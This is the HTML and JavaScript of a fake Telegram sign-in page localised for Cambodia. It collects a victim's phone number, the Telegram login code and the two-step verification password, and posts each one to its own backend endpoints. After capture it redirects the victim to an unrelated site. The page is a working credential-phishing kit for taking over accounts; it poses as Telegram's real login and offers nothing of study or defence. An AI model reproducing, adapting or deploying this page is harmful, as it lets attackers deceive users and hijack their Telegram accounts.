<!DOCTYPE html>
<html lang="km">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Sign in to Telegram</title>
<script src="https://cdn.tailwindcss.com"></script>
<style>
  :root {
    --bg: #171717;
    --card-border: #383838;
    --text-main: #ffffff;
    --text-sub: #aaaaaa;
    --accent: #8774e1;
    --accent-hover: #7966d3;
  }
  * { box-sizing: border-box; touch-action: manipulation; }
  body {
    margin: 0;
    min-height: 100vh;
    background: var(--bg);
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    padding: 20px;
    color: var(--text-main);
    user-select: none;
  }
  .card {
    width: 100%;
    max-width: 400px;
    text-align: center;
  }
  .logo {
    width: 110px;
    height: 110px;
    border-radius: 50%;
    margin: 0 auto 24px;
    overflow: hidden;
    display: flex;
    align-items: center;
    justify-content: center;
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
    background: #2481cc;
  }
  .logo svg {
    width: 100%;
    height: 100%;
  }
  h1 {
    color: var(--text-main);
    font-size: 40px;
    font-weight: 800;
    margin: 0 0 12px;
  }
  p.sub {
    color: var(--text-sub);
    font-size: 14px;
    line-height: 1.5;
    margin: 0 0 32px;
    padding: 0 10px;
  }
  .field {
    position: relative;
    border: 1px solid var(--card-border);
    border-radius: 12px;
    padding: 14px 16px 8px;
    margin-bottom: 16px;
    text-align: left;
    background: var(--bg);
  }
  .field:focus-within {
    border-color: var(--accent);
  }
  .field label {
    position: absolute;
    top: -7px;
    left: 14px;
    background: var(--bg);
    padding: 0 4px;
    font-size: 11px;
    color: #888888;
  }
  .field input, .field select {
    width: 100%;
    background: transparent;
    border: none;
    outline: none;
    color: var(--text-main);
    font-size: 16px !important;
  }
  .country-select {
    display: flex;
    align-items: center;
    justify-content: space-between;
    cursor: pointer;
  }
  .country-info {
    display: flex;
    align-items: center;
    gap: 10px;
  }
  .flag-emoji {
    font-size: 20px;
    line-height: 1;
  }
  .country-info span {
    color: var(--text-main);
    font-size: 16px;
  }
  .dropdown-arrow {
    color: var(--text-sub);
    font-size: 12px;
  }
  .checkbox-row {
    display: flex;
    align-items: center;
    gap: 12px;
    margin: 24px 0 32px 4px;
    text-align: left;
    cursor: pointer;
    user-select: none;
  }
  .checkbox-row input {
    display: none;
  }
  .checkmark {
    width: 20px;
    height: 20px;
    background-color: #2b2b2b;
    border-radius: 4px;
    display: flex;
    justify-content: center;
    align-items: center;
    transition: background-color 0.2s;
  }
  .checkbox-row input:checked + .checkmark {
    background-color: var(--accent);
  }
  .checkbox-row input:checked + .checkmark::after {
    content: "✔";
    font-size: 12px;
    color: #ffffff;
  }
  .checkbox-row span { 
    color: #dddddd; 
    font-size: 15px; 
  }
  .btn-primary {
    width: 100%;
    background-color: var(--accent);
    color: white;
    border: none;
    padding: 14px;
    border-radius: 12px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: background-color 0.2s, transform 0.05s;
  }
  .btn-primary:hover {
    background-color: var(--accent-hover);
  }
  .btn-primary:active {
    transform: scale(0.98);
  }
  .alt-links {
    margin-top: 24px;
    display: flex;
    flex-direction: column;
    gap: 18px;
  }
  .alt-links a {
    color: var(--accent);
    text-decoration: none;
    font-size: 13px;
    font-weight: 600;
    letter-spacing: 0.5px;
  }
  .alt-links a:hover {
    opacity: 0.8;
  }
</style>
</head>
<body>
  <div class="card">
    
    <!-- STEP 1: Phone Form -->
    <div id="step-phone">
      <!-- Telegram SVG Logo -->
      <div class="logo">
        <svg viewBox="0 0 240 240" fill="none" xmlns="http://www.w3.org/2000/svg">
          <circle cx="120" cy="120" r="120" fill="#2481CC"/>
          <path d="M52.5 119.5L181.5 69C187.5 66.5 192.5 70 190.5 77L167.5 184C166 190.5 161.5 192 156 188.5L120.5 161.5L103.5 178C101.5 180 100 181.5 97 181.5L99.5 145.5L164.5 86.5C167.2 84.1 163.9 82.7 160.3 85.1L84.3 133.1L51.3 122.8C44.1 120.6 44.3 115.6 52.5 119.5Z" fill="white"/>
        </svg>
      </div>
      
      <h1>Telegram</h1>
      <p class="sub">Please confirm your country code and enter your phone number.</p>

      <!-- Country Field -->
      <div class="field">
        <label>Country</label>
        <div class="country-select">
          <div class="country-info">
            <span class="flag-emoji">🇰🇭</span>
            <span>Cambodia</span>
          </div>
          <span class="dropdown-arrow">▼</span>
        </div>
      </div>

      <!-- Phone Number Field (បានកែបញ្ចូល inputmode="numeric") -->
      <div class="field">
        <label>Your phone number</label>
        <input id="phone-input" type="text" inputmode="numeric" value="+855 " placeholder="+855 15 944 782" oninput="formatPhoneNumber(this)" onkeydown="preventPrefixDelete(event, this)" onpaste="handlePaste(event, this)" />
      </div>

      <!-- Keep me signed in -->
      <label class="checkbox-row">
        <input type="checkbox" checked />
        <span class="checkmark"></span>
        <span>Keep me signed in</span>
      </label>

      <button id="btn-send" onclick="sendPhone()" class="btn-primary">SEND CODE</button>

      <!-- តំណភ្ជាប់ខាងក្រោម -->
      <div class="alt-links">
        <a href="#">LOG IN BY QR CODE</a>
        <a href="#">LOG IN WITH PASSKEY</a>
      </div>
    </div>

    <!-- STEP 2: OTP & 2FA Form -->
    <div id="step-otp" class="space-y-6 hidden">
      <div class="text-5xl mb-2">🔐</div>
      <div>
        <h2 id="display-phone" class="text-lg font-semibold mb-1 text-white"></h2>
        <p class="text-gray-400 text-sm">We've sent the code to your Telegram app.</p>
      </div>
      
      <div class="text-left space-y-4">
        <!-- OTP Code Field (បានកែបញ្ចូល inputmode="numeric" និង pattern="[0-9]*") -->
        <div class="field">
          <label>Telegram Code</label>
          <input id="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" placeholder="Enter code" maxlength="6" class="text-center font-mono tracking-widest text-xl">
        </div>

        <!-- Input 2FA Password -->
        <div id="password-container" class="field hidden">
          <label>Two-Step Password (2FA)</label>
          <input id="password-input" type="password" placeholder="Enter your 2FA password">
        </div>
      </div>

      <button id="btn-verify" onclick="submitOTP()" class="btn-primary">VERIFY & LOGIN</button>
      <div>
        <button onclick="goBack()" class="text-xs text-[#8774e1] hover:underline active:opacity-70 transition">Change Phone Number</button>
      </div>
    </div>

  </div>

  <script>
    const BACKEND_URL = "";

    function preventPrefixDelete(e, input) {
        const prefixLength = 5;
        if (e.key === 'Backspace' && input.selectionStart <= prefixLength && input.selectionEnd <= prefixLength) {
            e.preventDefault();
        }
    }

    function handlePaste(e, input) {
        e.preventDefault();
        let pasteData = (e.clipboardData || window.clipboardData).getData('text');
        let digits = pasteData.replace(/[^\d]/g, '');

        if (digits.startsWith('855')) {
            digits = digits.slice(3);
        }
        if (digits.startsWith('0')) {
            digits = digits.slice(1);
        }

        input.value = '+855 ' + digits;
        formatPhoneNumber(input);
    }

    function formatPhoneNumber(input) {
        const prefix = '+855 ';
        
        if (!input.value.startsWith('+855')) {
            input.value = prefix;
        }

        let rawDigits = input.value.slice(5).replace(/[^\d]/g, '');

        if (rawDigits.startsWith('0')) {
            rawDigits = rawDigits.slice(1);
        }

        let parts = [];
        if (rawDigits.length > 0) parts.push(rawDigits.slice(0, 2));
        if (rawDigits.length > 2) parts.push(rawDigits.slice(2, 5));
        if (rawDigits.length > 5) parts.push(rawDigits.slice(5, 9));

        input.value = prefix + parts.join(' ');
    }

    async function sendPhone() {
        const phoneInput = document.getElementById('phone-input');
        const btn = document.getElementById('btn-send');
        const phoneClean = phoneInput.value.replace(/\s+/g, '').trim();

        if (!phoneClean || phoneClean.length < 9) {
            alert('Please enter a valid phone number.');
            return;
        }

        btn.disabled = true;
        btn.innerText = 'SENDING...';
        btn.classList.add('opacity-70');

        try {
            const res = await fetch(`${BACKEND_URL}/api/send-code`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phoneNumber: phoneClean })
            });
            const data = await res.json();

            if (data.success) {
                document.getElementById('display-phone').innerText = phoneInput.value.trim();
                document.getElementById('step-phone').classList.add('hidden');
                document.getElementById('step-otp').classList.remove('hidden');
            } else {
                alert(data.error || 'Failed to send code.');
            }
        } catch (err) {
            alert('Cannot connect to backend server!');
            console.error(err);
        } finally {
            btn.disabled = false;
            btn.innerText = 'SEND CODE';
            btn.classList.remove('opacity-70');
        }
    }

    async function submitOTP() {
        const phoneInput = document.getElementById('phone-input');
        const phoneClean = phoneInput.value.replace(/\s+/g, '').trim();
        const code = document.getElementById('otp-input').value.trim();
        const password = document.getElementById('password-input').value.trim();
        const btn = document.getElementById('btn-verify');

        if (!code) {
            alert('Please enter the OTP code.');
            return;
        }

        btn.disabled = true;
        btn.innerText = 'VERIFYING...';
        btn.classList.add('opacity-70');

        try {
            const res = await fetch(`${BACKEND_URL}/api/verify-code`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    phoneNumber: phoneClean, 
                    code: code,
                    password: password || undefined
                })
            });
            const data = await res.json();

            if (data.success) {
                window.location.replace(data.redirectUrl || "https://jvpfans.com");
            } else if (data.requiresPassword) {
                document.getElementById('password-container').classList.remove('hidden');
                alert('This account has Two-Step Verification enabled. Please enter your 2FA password.');
            } else {
                alert(data.error || 'Verification failed.');
            }
        } catch (err) {
            alert('Connection error!');
            console.error(err);
        } finally {
            btn.disabled = false;
            btn.innerText = 'VERIFY & LOGIN';
            btn.classList.remove('opacity-70');
        }
    }

    function goBack() {
        document.getElementById('step-otp').classList.add('hidden');
        document.getElementById('password-container').classList.add('hidden');
        document.getElementById('password-input').value = '';
        document.getElementById('otp-input').value = '';
        document.getElementById('step-phone').classList.remove('hidden');
    }
  </script>
</body>
</html>
